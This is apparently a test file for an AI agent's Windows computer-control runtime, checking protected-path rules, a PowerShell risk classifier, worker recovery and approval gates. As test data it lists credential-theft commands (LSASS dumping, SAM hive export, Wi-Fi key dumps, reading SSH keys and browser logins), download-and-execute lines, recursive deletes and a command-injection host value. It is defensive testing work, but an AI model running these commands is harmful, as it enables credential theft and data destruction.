/**
 * Loopcom Computer Control — the deterministic core, proven without a screen:
 *   - the cross-tool resource policy (files / PowerShell / UIA / launch agree)
 *   - the shell classifier (READ_ONLY is a strict allowlist)
 *   - the Local Worker's lifecycle with a fake process (ready, calls, crash → rejected
 *     in-flight calls + onDied, restart with backoff, timeout → probe, deliberate stop)
 *   - the Windows façade over a fake worker (arg shaping, verification notes, menu walk)
 *   - the runtime gate: windows tools need the ask-once session; process_kill still
 *     asks inside it; a protected path is refused by fs AND by PowerShell AND by launch;
 *     a read-only script runs without the shell ask, a high-risk one always asks
 */
import test from "node:test";
import assert from "node:assert/strict";
import os from "node:os";
import path from "node:path";
import { mkdtempSync, mkdirSync, writeFileSync } from "node:fs";
import { EventEmitter } from "node:events";
import { PassThrough } from "node:stream";
import { isProtectedPath, scriptTouchesProtected, scriptPathLiterals, classifyShellScript } from "./computerControl/protectedResources";
import { LocalWorker, type SpawnLike } from "./computerControl/worker";
import { runWindowsTool, compactControls, WINDOWS_TOOL_NAMES } from "./computerControl/windowsControl";
import { WORKER_SCRIPT, SCREEN_CONTROL_SIGNATURE } from "./computerControl/workerScript";
import { SCREEN_CONTROL_SIGNATURE as SESSION_SIGNATURE, ScreenControlSession, SCREEN_IDLE_END_MS } from "./screenControl/session";
import type { ScreenController, ScreenActionName } from "./screenControl/controller";
import { CoworkerRuntime, toolGroup, isScreenSessionTool, type RuntimeDeps } from "./runtime";
import { McpManager } from "./runtime/mcp";
import { Journal } from "./runtime/journal";
import { TOOL_CATALOG, findTool } from "./toolCatalog";
import { inputOp } from "./screenControl/screenController";

/* ───────────────────────── cross-tool policy ───────────────────────── */

test("protected paths: credential stores, key files and Loopcom's own data are protected; ordinary files are not", () => {
  const yes = [
    "C:\\Users\\izzy\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data",
    "C:/Users/izzy/AppData/Local/Microsoft/Edge/User Data/Default/Cookies",
    "C:\\Users\\izzy\\.ssh\\id_rsa", "C:\\Users\\izzy\\.ssh", "~/.aws/credentials",
    "C:\\Users\\izzy\\AppData\\Roaming\\Microsoft\\Credentials\\abc",
    "C:\\Users\\izzy\\AppData\\Roaming\\@connect\\desktop\\settings.json",
    "C:\\Users\\izzy\\Documents\\server.pfx", "D:\\backup\\secret.pem", "C:\\x\\id_ed25519",
    "C:\\Users\\izzy\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\x\\logins.json",
    "C:\\Windows\\System32\\config\\SAM", "C:\\Users\\izzy\\.git-credentials", "C:\\Users\\izzy\\.npmrc",
  ];
  for (const p of yes) assert.equal(isProtectedPath(p).protected, true, p);
  const no = [
    "C:\\Users\\izzy\\Documents\\invoice.pdf", "C:\\Users\\izzy\\Desktop\\notes.txt", "C:\\Users\\izzy\\.sshfoo\\x.txt",
    "C:\\Users\\izzy\\Downloads\\system.txt", "C:\\Users\\izzy\\AppData\\Local\\Temp\\a.log", "C:\\Users\\izzy\\project\\README.md",
    "C:\\Users\\izzy\\AppData\\Local\\Google\\Chrome\\Application\\chrome.exe", "", 42,
  ];
  for (const p of no) assert.equal(isProtectedPath(p as string).protected, false, String(p));
});

test("protected commands: credential manager, DPAPI, LSASS, hive export, wifi keys, browser secret files, Loopcom's own data", () => {
  const bad = ["cmdkey /list", "vaultcmd /listcreds", "Get-StoredCredential -Target x", "[System.Security.Cryptography.ProtectedData]::Unprotect($b,$null,0)",
    "procdump -ma lsass.exe", "reg save HKLM\\SAM sam.hiv", "netsh wlan show profile name=Home key=clear", "Export-PfxCertificate -Cert $c -FilePath x.pfx",
    "Copy-Item 'C:\\Users\\izzy\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data' out", "Get-Content $env:APPDATA\\@connect\\desktop\\settings.json", "Write-Output $env:OPENAI_API_KEY",
    "Get-Content C:\\Users\\izzy\\.ssh\\id_rsa"];
  for (const s of bad) assert.equal(scriptTouchesProtected(s).ok, false, s);
  const fine = ["Get-Process | Sort-Object CPU", "Get-ChildItem C:\\Users\\izzy\\Downloads -Filter *.pdf", "Get-CimInstance Win32_OperatingSystem", "Test-NetConnection app.connectcomunications.com -Port 443"];
  for (const s of fine) assert.equal(scriptTouchesProtected(s).ok, true, s);
});

test("script path literals: drive paths, UNC, ~ and $env: paths are found; quoted or bare", () => {
  const lits = scriptPathLiterals(`Get-ChildItem "C:\\Users\\izzy\\Downloads" | Out-Null; Copy-Item D:/a/b.txt '\\\\server\\share\\x'; cat ~/notes.txt; ls $env:USERPROFILE\\Desktop`);
  assert.ok(lits.includes("C:\\Users\\izzy\\Downloads"));
  assert.ok(lits.includes("D:/a/b.txt"));
  assert.ok(lits.some((l) => l.startsWith("\\\\server\\share")));
  assert.ok(lits.includes("~/notes.txt"));
  assert.ok(lits.some((l) => l.startsWith("$env:USERPROFILE")));
  assert.deepEqual(scriptPathLiterals("Get-Process"), []);
});

test("shell classification: read-only is a strict allowlist; modify and high-risk are recognised", () => {
  const ro = ["Get-Process | Sort-Object WorkingSet64 -Descending | Select-Object -First 5", "'x'", "Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=3' | ConvertTo-Json -Compress",
    "$d = Get-Date; Write-Output $d.ToString('o')", "Get-ChildItem $env:USERPROFILE\\Downloads -Filter *.pdf | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-7) } | Select-Object Name, Length",
    "Test-NetConnection app.connectcomunications.com -Port 443", "[math]::Round(3.14159, 2)", "(Get-Content notes.txt).Length", "hostname.exe", "ipconfig.exe /all"];
  for (const s of ro) assert.equal(classifyShellScript(s).class, "READ_ONLY", s + " " + JSON.stringify(classifyShellScript(s).reasons));
  const mod = ["New-Item -ItemType Directory -Path made", "Set-Content out.txt 'x'", "Get-Process notepad | Stop-Process", "'x' > out.txt", "Remove-Item a.txt", "$o.Enabled = $true",
    "Start-Process notepad.exe", "& 'C:\\tools\\x.exe'", ". .\\script.ps1", "Get-ChildItem | ForEach-Object { Remove-Item $_ }", "[IO.File]::WriteAllText('a','b')", "Copy-Item a b", "robocopy a b", "Get-Process | Out-File p.txt", "$x.Delete()", "Rename-Item a b"];
  for (const s of mod) assert.equal(classifyShellScript(s).class, "MODIFY", s + " " + JSON.stringify(classifyShellScript(s).reasons));
  const high = ["Invoke-Expression $cmd", "iex (iwr http://x/y)", "Remove-Item C:\\Users\\izzy\\Documents -Recurse -Force", "Start-Process cmd -Verb RunAs", "reg add HKLM\\Software\\X /v y /d z",
    "schtasks /create /tn x /tr y", "Set-ExecutionPolicy Unrestricted", "Stop-Process -Name explorer", "Invoke-WebRequest http://x/a.exe -OutFile a.exe", "Add-Type -MemberDefinition '[DllImport(\"kernel32\")]...' -Name X", "Stop-Process -Id 1 -Force"];
  for (const s of high) assert.equal(classifyShellScript(s).class, "HIGH_RISK", s);
});

test("the worker stamps every injected event with the SAME signature the session declares", () => {
  assert.equal(SCREEN_CONTROL_SIGNATURE, SESSION_SIGNATURE);
  assert.ok(WORKER_SCRIPT.includes("0x100CC01CL"), "the C# constant matches 0x100CC01C");
  assert.equal(SCREEN_CONTROL_SIGNATURE, 0x100cc01c);
  // the hook must never swallow: every callback returns CallNextHookEx
  const hooks = WORKER_SCRIPT.match(/static IntPtr (?:Mouse|Key)Hook[\s\S]*?return CallNextHookEx/g) ?? [];
  assert.equal(hooks.length, 2);
  // the hook is only ever installed on demand (hook.start), not at worker start
  assert.ok(!/Init\(\)[\s\S]*?SetWindowsHookEx[\s\S]*?\n\s*\}/.test(WORKER_SCRIPT.slice(WORKER_SCRIPT.indexOf("public static void Init()"), WORKER_SCRIPT.indexOf("public static void Init()") + 400)));
  // C# 5 only: no string interpolation, no nameof, no out var
  assert.ok(!/\$"/.test(WORKER_SCRIPT)); assert.ok(!/\bnameof\(/.test(WORKER_SCRIPT)); assert.ok(!/\bout var\b/.test(WORKER_SCRIPT));
  // reserved chords the model may never send
  assert.ok(WORKER_SCRIPT.includes("refused_chord"));
});

/* ───────────────────────── the worker lifecycle (fake process) ───────────────────────── */

class FakeProc extends EventEmitter {
  stdin = new PassThrough(); stdout = new PassThrough(); stderr = new PassThrough();
  pid = 4242; killed = false;
  lines: string[] = [];
  constructor(private opts: { ready?: boolean; readyDelayMs?: number; answer?: (msg: any) => any; hang?: boolean } = {}) {
    super();
    this.stdin.on("data", (d: Buffer) => {
      for (const line of d.toString("utf8").split("\n")) {
        if (!line.trim()) continue;
        this.lines.push(line);
        const msg = JSON.parse(line);
        if (msg.op === "exit") { setTimeout(() => this.emit("exit", 0, null), 5); continue; }
        if (this.opts.hang) continue;
        const res = this.opts.answer ? this.opts.answer(msg) : { id: msg.id, ok: true, result: { echoed: msg.op } };
        if (res) setTimeout(() => this.stdout.write(JSON.stringify({ id: msg.id, ...res }) + "\n"), 2);
      }
    });
    if (this.opts.ready !== false) setTimeout(() => this.stdout.write('{"event":"ready","protocol":3,"pid":4242}\n'), this.opts.readyDelayMs ?? 5);
  }
  kill() { this.killed = true; setTimeout(() => this.emit("exit", null, "SIGTERM"), 5); return true; }
  crash() { this.emit("exit", 1, null); }
}

function workerWith(procs: FakeProc[] | (() => FakeProc), extra: Partial<ConstructorParameters<typeof LocalWorker>[0]> = {}) {
  const dir = mkdtempSync(path.join(os.tmpdir(), "lc-worker-"));
  const spawned: FakeProc[] = [];
  const spawn: SpawnLike = () => { const p = typeof procs === "function" ? procs() : procs[spawned.length]; spawned.push(p); return p as unknown as ReturnType<SpawnLike>; };
  const events: any[] = []; const died: string[] = []; const log: string[] = [];
  const w = new LocalWorker({ dir, log: (l) => log.push(l), spawn, onEvent: (e) => events.push(e), onDied: (r) => died.push(r), script: "fake", ...extra });
  return { w, spawned, events, died, log, dir };
}

test("worker: starts lazily, answers calls, routes events, writes the script, reports health", async () => {
  const { w, spawned, events, dir } = workerWith([new FakeProc()]);
  assert.equal(w.alive, false);
  const r = await w.call("windows.list", { filter: "x" });
  assert.equal(r.ok, true); assert.equal((r as any).result.echoed, "windows.list");
  assert.equal(w.alive, true); assert.equal(spawned.length, 1);
  assert.ok(require("node:fs").existsSync(path.join(dir, "loopcom-worker.ps1")));
  spawned[0].stdout.write('{"event":"input","kind":"escape"}\n');
  await new Promise((r) => setTimeout(r, 10));
  assert.deepEqual(events[0], { event: "input", kind: "escape" });
  const h = await w.health();
  assert.equal(h.alive, true);
  assert.equal(h.calls, 2);
  await w.stop("test");
  assert.equal(w.alive, false);
});

test("worker: a crash rejects every in-flight call with worker_died, fires onDied, and the next call respawns", async () => {
  const p1 = new FakeProc({ hang: true }); const p2 = new FakeProc();
  const { w, spawned, died } = workerWith([p1, p2]);
  await w.start();
  const inflight = w.call("windows.controls", {}, 5000);
  await new Promise((r) => setTimeout(r, 10));
  p1.crash();
  const r = await inflight;
  assert.equal(r.ok, false); assert.equal((r as any).error, "worker_died");
  assert.equal(died.length, 1);
  assert.equal(w.alive, false);
  const t0 = Date.now();
  const r2 = await w.call("ping", {});
  assert.equal(r2.ok, true); assert.equal(spawned.length, 2);
  assert.ok(Date.now() - t0 >= 400, "backoff applied after a crash");
  assert.equal(w.stats.crashes, 1);
  await w.stop();
});

test("worker: a call that times out is a result (not a throw); a wedged worker is probed and killed for restart", async () => {
  const p1 = new FakeProc({ hang: true });
  const { w, spawned } = workerWith([p1, new FakeProc()]);
  const r = await w.call("windows.controls", {}, 60);
  assert.equal(r.ok, false); assert.equal((r as any).error, "worker_timeout");
  await new Promise((r) => setTimeout(r, 4300));
  assert.equal(p1.killed, true, "the probe found it wedged and killed it");
  assert.equal(w.stats.timeouts, 1);
  await w.stop();
  void spawned;
});

test("worker: never ready → start fails cleanly and the call reports worker_unavailable; deliberate stop is not a crash", async () => {
  const { w, died } = workerWith(() => new FakeProc({ ready: false }));
  // shorten: START_TIMEOUT is 25 s in prod; the fake never says ready, so a fatal line ends it early
  const p = w.call("ping", {}, 1000);
  await new Promise((r) => setTimeout(r, 20));
  const r = await Promise.race([p, new Promise((res) => setTimeout(() => res("pending"), 300))]);
  // the fake emits nothing; simulate the worker's fatal line to unblock deterministically
  if (r === "pending") { (w as any).child?.stdout.write('{"event":"fatal","message":"compile"}\n'); }
  const out = await p;
  assert.equal(out.ok, false); assert.equal((out as any).error, "worker_unavailable");
  assert.equal(died.length, 0, "a start failure is not a crash of a running worker");
});

test("worker: cancelAll drops queued calls as task_cancelled; the worker itself keeps running", async () => {
  const p = new FakeProc({ hang: true });
  const { w } = workerWith([p]);
  await w.start();
  const a = w.call("x", {}, 5000); const b = w.call("y", {}, 5000);
  await new Promise((r) => setTimeout(r, 5));
  assert.equal(w.cancelAll(), 2);
  assert.equal((await a as any).error, "task_cancelled"); assert.equal((await b as any).error, "task_cancelled");
  assert.equal(w.alive, true);
  await w.stop();
});

/* ───────────────────────── the façade over a fake worker ───────────────────────── */

test("façade: window args are shaped, refs/names are required, values are read back, protected paths are refused, launch verifies a window", async () => {
  const calls: { op: string; args: any }[] = [];
  const call = async (op: string, args: any) => {
    calls.push({ op, args });
    switch (op) {
      case "windows.list": return { ok: true as const, result: { windows: [{ hwnd: 1, title: "Notepad", process: "Notepad" }], count: 1 } };
      case "windows.controls": return { ok: true as const, result: { window: "Untitled - Notepad", hwnd: 1, controls: [{ ref: "e1_1", type: "Document", name: "Text editor", can: ["value"], value: "", depth: 1, rect: { x: 1, y: 2, w: 3, h: 4 } }], truncated: false, snapshot: "e1" } };
      case "windows.set_value": return { ok: true as const, result: { set: true, via: "value_pattern", ref: args.ref, verified: args.value === "hello", readback: "hello" } };
      case "windows.invoke": return { ok: true as const, result: { invoked: true, via: "invoke", name: "Save", after: { type: "Button" }, foreground: { title: "Save As" } } };
      case "windows.activate": return { ok: true as const, result: { activated: false, foregroundTitle: "Other" } };
      case "process.launch": return { ok: true as const, result: { launched: true, pid: 7, window: { title: "Calculator", hwnd: 9 } } };
      case "windows.find_control": return { ok: true as const, result: { controls: args.name === "File" ? [{ ref: "e2_1", type: "MenuItem", name: "File" }] : [], count: args.name === "File" ? 1 : 0 } };
      case "windows.wait_for_control": return { ok: true as const, result: { found: true, controls: [{ ref: "e3_1", type: "MenuItem", name: "Save as" }], count: 1 } };
      case "windows.foreground": return { ok: true as const, result: { title: "Save As" } };
      default: return { ok: false as const, error: "unknown_op", message: op };
    }
  };
  const list = await runWindowsTool("computer_windows_list", { filter: "note" }, call);
  assert.equal(list.ok, true); assert.equal(calls[0].args.filter, "note");
  const ctl = await runWindowsTool("computer_windows_controls", { window: "Notepad" }, call);
  assert.equal(ctl.ok, true); assert.equal((ctl.controls as any[])[0].ref, "e1_1"); assert.equal(calls[1].args.title, "Notepad");
  const byHwnd = await runWindowsTool("computer_windows_controls", { window: 12345 }, call);
  assert.equal(byHwnd.ok, true); assert.equal(calls[2].args.hwnd, 12345);
  const noRef = await runWindowsTool("computer_windows_set_value", { value: "x" }, call);
  assert.equal(noRef.ok, false); assert.equal(noRef.error, "no_ref");
  const setv = await runWindowsTool("computer_windows_set_value", { ref: "e1_1", value: "hello" }, call);
  assert.equal(setv.ok, true); assert.equal(setv.verified, true); assert.match(String(setv.note), /matches/);
  const setv2 = await runWindowsTool("computer_windows_set_value", { ref: "e1_1", value: "other" }, call);
  assert.equal(setv2.verified, false); assert.match(String(setv2.note), /differs/);
  const prot = await runWindowsTool("computer_windows_set_value", { ref: "e1_1", value: "C:\\Users\\izzy\\.ssh\\id_rsa" }, call);
  assert.equal(prot.ok, false); assert.equal(prot.error, "protected_resource");
  const inv = await runWindowsTool("computer_windows_invoke", { ref: "e1_5" }, call);
  assert.equal(inv.ok, true); assert.ok(inv.verify);
  const act = await runWindowsTool("computer_windows_activate", { window: "Notepad" }, call);
  assert.equal(act.ok, false); assert.equal(act.error, "activate_failed");
  const launch = await runWindowsTool("computer_app_launch", { app: "calculator" }, call);
  assert.equal(launch.ok, true); assert.equal(launch.verified, true);
  const launchProt = await runWindowsTool("computer_app_launch", { app: "notepad", args: "C:\\Users\\izzy\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data" }, call);
  assert.equal(launchProt.ok, false); assert.equal(launchProt.error, "protected_resource");
  const menu = await runWindowsTool("computer_windows_menu", { window: "Notepad", path: ["File", "Save as"] }, call);
  assert.equal(menu.ok, true); assert.equal((menu.steps as any[]).length, 2); assert.equal((menu.steps as any[])[1].ref, "e3_1");
  const kill = await runWindowsTool("computer_process_kill", {}, call);
  assert.equal(kill.ok, false); assert.equal(kill.error, "no_target");
  assert.deepEqual(compactControls([{ ref: "a", type: "Edit", name: "N", value: "", enabled: true, rect: { x: 1 } }]), [{ ref: "a", type: "Edit", name: "N", rect: { x: 1 } }]);
});

test("inputOp: fractions must be 0..1, px are rounded, empty text/keys are refused, modifiers are sanitised", () => {
  assert.equal(inputOp("computer_screen_click", { x: 1.5, y: 0.2 }), null);
  assert.deepEqual(inputOp("computer_screen_click", { x: 0.5, y: 0.25, button: "right" }), { op: "input.click", args: { x: 0.5, y: 0.25, unit: "fraction", button: "right", double: false } });
  assert.deepEqual(inputOp("computer_screen_click", { x: 100.4, y: 200.6, unit: "px" }), { op: "input.click", args: { x: 100, y: 201, unit: "px", button: "left", double: false } });
  assert.equal(inputOp("computer_screen_type", { text: "" }), null);
  assert.deepEqual(inputOp("computer_screen_key", { key: "a", modifiers: ["ctrl", "x y"] }), { op: "input.key", args: { key: "a", modifiers: ["ctrl"] } });
  assert.deepEqual(inputOp("computer_screen_scroll", { x: 0.1, y: 0.1, amount: -2 }), { op: "input.scroll", args: { x: 0.1, y: 0.1, unit: "fraction", deltaY: -240 } });
});

/* ───────────────────────── the runtime gate ───────────────────────── */

class FakeScreen implements ScreenController {
  readonly session = new ScreenControlSession();
  enabled = true; ops: { name: string; args: Record<string, unknown> }[] = [];
  isEnabled() { return this.enabled; }
  isApprovedFor(taskId: string) { return this.session.isApprovedFor(taskId); }
  async begin(taskId: string) { this.session.begin(taskId); return { ok: true }; }
  async read() { return { ok: true, controls: [] }; }
  async look() { return { ok: true, image: { mediaType: "image/jpeg", dataBase64: "/9j/", width: 1, height: 1 } }; }
  async act(_t: string, name: ScreenActionName, args: Record<string, unknown>) { this.ops.push({ name, args }); return { ok: true }; }
  async capture(_t: string, saveAs: string | undefined) { return { ok: true, path: saveAs ?? "x" }; }
  async windows(_t: string, name: string, args: Record<string, unknown>) { this.ops.push({ name, args }); return { ok: true, name }; }
  async end() { this.session.end(); this.session.reset(); return { ok: true, ended: true }; }
  async health() { return { alive: true }; }
}

function rt(opts: { profile?: "SAFE" | "TRUSTED" | "AUTONOMOUS"; screen?: FakeScreen | null; approve?: boolean } = {}) {
  const dir = mkdtempSync(path.join(os.tmpdir(), "lc-cc-"));
  mkdirSync(path.join(dir, "ws"), { recursive: true });
  const asks: any[] = [];
  const screen = opts.screen === null ? undefined : (opts.screen ?? new FakeScreen());
  const deps: RuntimeDeps = {
    home: dir, workspace: path.join(dir, "ws"), extraRoots: () => [],
    permissions: () => ({ profile: opts.profile ?? "SAFE", overrides: {} }),
    isCallActive: () => false, coworkerEnabled: () => true,
    askApproval: async (req) => { asks.push(req); return { approved: opts.approve !== false, how: "test" }; },
    browser: { cancel() {}, currentUrl: () => null } as any,
    screen, mcp: new McpManager(() => {}), journal: new Journal(path.join(dir, "j")),
    openPath: async () => {}, showInFolder: () => {},
    diagnostics: { portalUrl: "https://x.invalid", appVersion: "t", logFile: path.join(dir, "l.log"), phoneState: () => null, linkState: () => ({}) },
    log: () => {},
  };
  return { runtime: new CoworkerRuntime(deps), asks, screen: screen as FakeScreen, dir };
}

test("catalogue: every windows tool is in the catalogue, session-governed, and grouped; the runtime hides them without a controller", () => {
  for (const n of WINDOWS_TOOL_NAMES) { assert.ok(findTool(n), n); assert.ok(isScreenSessionTool(n), n); assert.equal(toolGroup(n), "windows", n); assert.ok(findTool(n)!.spec.domains.includes("desktop.active"), n); }
  assert.equal(toolGroup("computer_screen_look"), "screen"); assert.equal(toolGroup("computer_services"), "services"); assert.equal(toolGroup("computer_network_test"), "system");
  assert.equal(findTool("computer_process_kill")!.spec.alwaysRequireApproval, true);
  assert.equal(findTool("computer_service_control")!.spec.domains[0], "windows.services");
  const without = rt({ screen: null }).runtime.manifestTools().map((t) => t.name);
  assert.ok(!without.some((n) => n.startsWith("computer_windows_") || n === "computer_app_launch"));
  const withIt = rt().runtime.manifestTools().map((t) => t.name);
  assert.ok(withIt.includes("computer_windows_invoke") && withIt.includes("computer_app_launch"));
  assert.equal(TOOL_CATALOG.length, withIt.length + TOOL_CATALOG.filter((t) => t.name.startsWith("computer_chrome_")).length);
});

test("runtime: windows tools refuse without a session; after ONE begin approval they flow (0 asks); process_kill still asks inside the session", async () => {
  const { runtime, asks, screen } = rt({ profile: "SAFE" });
  const noSession = await runtime.handle({ id: "a", name: "computer_app_launch", args: { app: "notepad" }, taskId: "t1" });
  assert.equal(noSession.ok, false); assert.equal((noSession.content as any).error, "screen_not_started");
  const begin = await runtime.handle({ id: "b", name: "computer_screen_begin", args: { reason: "open notepad" }, taskId: "t1" });
  assert.equal(begin.ok, true); assert.equal(asks.length, 1);
  for (let i = 0; i < 200; i++) {
    const r = await runtime.handle({ id: `c${i}`, name: (["computer_app_launch", "computer_windows_controls", "computer_windows_invoke", "computer_windows_set_value", "computer_windows_select", "computer_windows_menu"] as const)[i % 6], args: { app: "notepad", ref: "e1_1", value: "x", path: ["File"] }, taskId: "t1" });
    assert.equal(r.ok, true, JSON.stringify(r.content));
  }
  assert.equal(asks.length, 1, "no re-ask across 200 program actions");
  assert.equal(screen.ops.length, 200);
  const kill = await runtime.handle({ id: "k", name: "computer_process_kill", args: { name: "notepad" }, taskId: "t1" });
  assert.equal(kill.ok, true); assert.equal(asks.length, 2, "ending a program asks even inside the session");
  assert.equal(asks[1].title, "End a program?");
  // another task cannot ride this session
  const other = await runtime.handle({ id: "o", name: "computer_windows_controls", args: {}, taskId: "t2" });
  assert.equal((other.content as any).error, "screen_not_started");
});

test("⛔⛔ an ABANDONED screen session never locks the screen: it ends itself and another task may take over", async () => {
  const now = { t: 1_000_000 };
  const s = new ScreenControlSession(() => now.t);
  assert.equal(s.begin("taskA"), true);
  assert.equal(s.begin("taskB"), false, "a WORKING session is never interrupted");
  s.touch();
  now.t += 60_000;                       // one minute of silence
  assert.equal(s.isStale(), false);
  assert.equal(s.begin("taskB"), false, "still working as far as anyone knows");
  now.t += SCREEN_IDLE_END_MS;           // …and now it has clearly been abandoned
  assert.equal(s.isStale(), true);
  assert.equal(s.begin("taskB"), true, "the next task may take the screen");
  assert.equal(s.owner(), "taskB");
  assert.equal(s.isApprovedFor("taskA"), false, "the abandoned task's consent did not carry over");
  assert.equal(s.isStale(), false, "taking over resets the clock");
  // and an action keeps it alive
  now.t += SCREEN_IDLE_END_MS - 1000; s.touch(); now.t += 2000;
  assert.equal(s.isStale(), false);
});

test("runtime: the cross-tool rule — a protected path is refused by the file tools, by PowerShell, and by app launch alike; a path outside the fence is refused for PowerShell too", async () => {
  const { runtime, asks, dir } = rt({ profile: "AUTONOMOUS" });
  const secret = path.join(dir, ".ssh", "id_rsa");
  mkdirSync(path.dirname(secret), { recursive: true }); writeFileSync(secret, "PRIVATE");
  const f = await runtime.handle({ id: "1", name: "computer_fs_read", args: { path: secret }, taskId: "t" });
  assert.equal(f.ok, false); assert.equal((f.content as any).error, "protected_resource");
  const ps = await runtime.handle({ id: "2", name: "computer_powershell", args: { script: `Get-Content "${secret}"` }, taskId: "t" });
  assert.equal(ps.ok, false); assert.match(String((ps.content as any).error), /protected_resource/);
  const ps2 = await runtime.handle({ id: "3", name: "computer_powershell", args: { script: "cmdkey /list" }, taskId: "t" });
  assert.equal(ps2.ok, false); assert.match(String((ps2.content as any).error), /protected_resource:credential_manager/);
  const fence = await runtime.handle({ id: "4", name: "computer_powershell", args: { script: "Get-ChildItem C:\\Windows\\System32" }, taskId: "t" });
  assert.equal(fence.ok, false); assert.match(String((fence.content as any).error), /path_fence/);
  await runtime.handle({ id: "5", name: "computer_screen_begin", args: { reason: "x" }, taskId: "t" });
  const launch = await runtime.handle({ id: "6", name: "computer_app_launch", args: { app: "notepad", args: secret }, taskId: "t" });
  assert.equal(launch.ok, false); assert.equal((launch.content as any).error, "protected_resource");
  assert.equal(asks.length, 1, "only the screen begin asked; refusals never ask");
});

test("runtime: PowerShell classification — READ_ONLY runs with no ask under SAFE, MODIFY asks under SAFE, HIGH_RISK asks even under AUTONOMOUS", async () => {
  const safe = rt({ profile: "SAFE" });
  const ro = await safe.runtime.handle({ id: "1", name: "computer_powershell", args: { script: "Get-Date | Out-String" }, taskId: "t" });
  assert.equal(ro.ok, true); assert.equal(safe.asks.length, 0); assert.equal((ro.content as any).classification, "READ_ONLY");
  const mod = await safe.runtime.handle({ id: "2", name: "computer_powershell", args: { script: "New-Item -ItemType Directory -Path made2" }, taskId: "t" });
  assert.equal(mod.ok, true); assert.equal(safe.asks.length, 1);
  const auto = rt({ profile: "AUTONOMOUS" });
  const high = await auto.runtime.handle({ id: "3", name: "computer_powershell", args: { script: "Remove-Item made -Recurse -Force" }, taskId: "t" });
  assert.equal(auto.asks.length, 1, "high-risk always asks"); assert.match(auto.asks[0].what, /HIGH RISK/);
  void high;
  const modAuto = await auto.runtime.handle({ id: "4", name: "computer_powershell", args: { script: "New-Item -ItemType Directory -Path made3" }, taskId: "t" });
  assert.equal(modAuto.ok, true); assert.equal(auto.asks.length, 1, "MODIFY flows under AUTONOMOUS");
});

test("runtime: service control always asks (NEVER_AUTO domain), protected services are refused after the ask, network/service reads never ask", async () => {
  const { runtime, asks } = rt({ profile: "AUTONOMOUS" });
  const svc = await runtime.handle({ id: "1", name: "computer_services", args: { name: "Spooler" }, taskId: "t" });
  assert.equal(asks.length, 0); assert.equal(svc.ok, true);
  const prot = await runtime.handle({ id: "2", name: "computer_service_control", args: { name: "WinDefend", action: "stop" }, taskId: "t" });
  assert.equal(asks.length, 1); assert.equal(prot.ok, false); assert.equal((prot.content as any).error, "protected_service");
  const net = await runtime.handle({ id: "3", name: "computer_network_test", args: { host: "127.0.0.1", port: 0, count: 1 }, taskId: "t" });
  assert.equal(asks.length, 1); assert.equal(net.ok, true);
  const badHost = await runtime.handle({ id: "4", name: "computer_network_test", args: { host: "x; rm -rf" }, taskId: "t" });
  assert.equal(badHost.ok, false);
});
